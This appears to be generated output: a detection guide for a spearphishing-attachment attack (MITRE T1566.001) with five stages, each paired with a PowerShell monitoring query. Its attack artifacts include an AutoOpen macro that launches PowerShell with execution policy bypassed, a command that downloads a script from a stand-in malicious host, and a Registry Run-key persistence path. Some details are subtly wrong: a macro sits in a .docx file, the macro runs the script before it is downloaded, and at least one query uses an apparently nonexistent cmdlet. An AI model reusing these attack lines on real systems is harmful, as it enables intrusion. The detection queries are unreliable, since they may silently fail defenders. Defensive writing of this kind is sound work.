<output>
Pattern Name: T1566.001 - Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload. The attack progresses through various applications, including Outlook for email access, and a web browser for downloading additional payloads, ultimately leading to the execution of malicious code.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Application Involved**: Microsoft Outlook
- **User Action**: The user receives an email with a subject line "Invoice Attached" and an attachment named "Invoice_12345.docx".
- **Key Artifacts**: 
  - Email Subject: "Invoice Attached"
  - Attachment: `Invoice_12345.docx`
- **Detection Rule**: Monitor for emails with suspicious subject lines and attachments from unknown senders.

```shell
# Monitor for incoming emails with specific subject lines and attachments
Get-Mailbox -ResultSize Unlimited | Get-MailboxFolderStatistics | Where-Object { $_.FolderType -eq "Inbox" } | Get-MailItem | Where-Object { $_.Subject -like "*Invoice Attached*" -and $_.Attachments -ne $null }
```

**Stage 2: Document Execution**
- **Application Involved**: Microsoft Word
- **User Action**: The user opens the attachment, which contains a macro that executes a PowerShell command to download a malicious payload.
- **Key Artifacts**: 
  - Document: `Invoice_12345.docx`
  - Macro Code: `Sub AutoOpen() Shell("powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\Users\User\Downloads\malicious.ps1") End Sub`
- **Detection Rule**: Monitor for the execution of macros in Word documents, especially those that invoke PowerShell.

```shell
# Monitor for execution of macros in Word documents
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Word/Operational'; Id=140} | Where-Object { $_.Message -like "*AutoOpen*" }
```

**Stage 3: Payload Download**
- **Application Involved**: PowerShell
- **User Action**: The macro executes a PowerShell command that downloads a malicious script from a remote server.
- **Key Artifacts**: 
  - PowerShell Command: `Invoke-WebRequest -Uri "http://malicious-server.com/malicious.ps1" -OutFile "C:\Users\User\Downloads\malicious.ps1"`
- **Detection Rule**: Monitor for PowerShell commands that download files from suspicious URLs.

```shell
# Monitor for PowerShell commands that download files
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; Id=4104} | Where-Object { $_.Message -like "*Invoke-WebRequest*" -and $_.Message -like "*malicious-server.com*" }
```

**Stage 4: Execution of Malicious Payload**
- **Application Involved**: PowerShell
- **User Action**: The downloaded script is executed, which may perform further actions such as establishing persistence or exfiltrating data.
- **Key Artifacts**: 
  - Executed Script: `C:\Users\User\Downloads\malicious.ps1`
- **Detection Rule**: Monitor for the execution of scripts from the Downloads folder, especially those that are newly created.

```shell
# Monitor for execution of scripts from the Downloads folder
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; Id=4104} | Where-Object { $_.Message -like "*C:\Users\User\Downloads\malicious.ps1*" }
```

**Stage 5: Establishing Persistence**
- **Application Involved**: Registry Editor
- **User Action**: The malicious script modifies the Registry to ensure it runs on startup.
- **Key Artifacts**: 
  - Registry Key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousApp`
- **Detection Rule**: Monitor for modifications to the Registry keys associated with startup programs.

```shell
# Monitor for modifications to the Registry Run keys
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Security-Auditing'; Id=4657} | Where-Object { $_.Message -like "*HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run*" }
```

</output>